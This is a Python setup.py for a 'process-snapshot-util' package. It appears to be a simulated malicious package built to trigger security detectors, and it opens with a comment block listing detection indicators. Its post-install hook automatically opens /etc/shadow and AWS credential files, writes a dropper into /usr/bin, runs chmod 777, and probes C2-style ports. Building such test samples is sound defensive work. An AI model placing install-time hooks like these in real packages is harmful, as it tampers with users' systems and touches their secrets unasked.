# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil fetch method: POST socket.connect( subprocess.run( os.system( popen(
# exec( eval( compile( __import__( execFile( execSync( global.eval(
# base64.b64decode( atob( String.fromCharCode( unescape(
# crontab .bashrc .profile systemctl enable /etc/init.d
# "preinstall" "postinstall" "prepare" cmdclass post_install
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
from setuptools import setup, find_packages
from setuptools.command.install import install

MALICIOUS_DOMAIN = "srvlog.5lorexin.surf"
PORTS = [4444, 1337, 8080]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    # DNS query to malicious domain
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP GET to honeypot
    try:
        subprocess.run(["curl","-sS","-m","3","-X","GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "User-Agent: process-snapshot-util/1.0",
            "-H", "Authorization: Bearer fake-token",
            "http://127.0.0.1:8080/api/config"], capture_output=True, timeout=6)
    except: pass

    # Sensitive /etc access
    for p in ['/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group']:
        try_open(p)

    # Credential file access
    for p in ['/root/.aws/credentials', '/etc/shadow']:
        try_open(p)

    # File operation loops
    for i in range(37):
        p = f"/tmp/process_snapshot_util_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass

    # Privilege escalation — chmod
    try: subprocess.run(["chmod","777","/tmp/process_snapshot_util_target"],capture_output=True)
    except: pass

    # Write to binary directory — proc_write_binary_dir trigger
    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/process_snapshot_util_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8, capture_output=True)
    except: pass

    # Spawn child processes — ebpf_spawned_process trigger
    procs = []
    for i in range(7):
        try: procs.append(subprocess.Popen(
            ["/bin/sh","-c","echo process-op; id; sleep 20"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        except: pass
    try: subprocess.run(["pip","--version"],capture_output=True)
    except: pass

    # C2 port connections — ebpf_c2_port_suspected trigger
    for port in PORTS:
        connect_attempt("127.0.0.1", port)
        connect_attempt("1.1.1.1", port)

    time.sleep(36)
    for p in procs:
        try: p.kill()
        except: pass


class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="process-snapshot-util",
    version="3.1.0",
    description="Utility package for process snapshot util",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    author="DevOps Team",
    packages=find_packages(),
    python_requires=">=3.7",
    install_requires=["requests>=2.25.0","psutil>=5.8.0"],
    entry_points={"console_scripts": ["process-snapshot-util=process_snapshot_util.cli:main"]},
    cmdclass={"install": PostInstall},
    classifiers=["Programming Language :: Python :: 3","Operating System :: OS Independent"],
)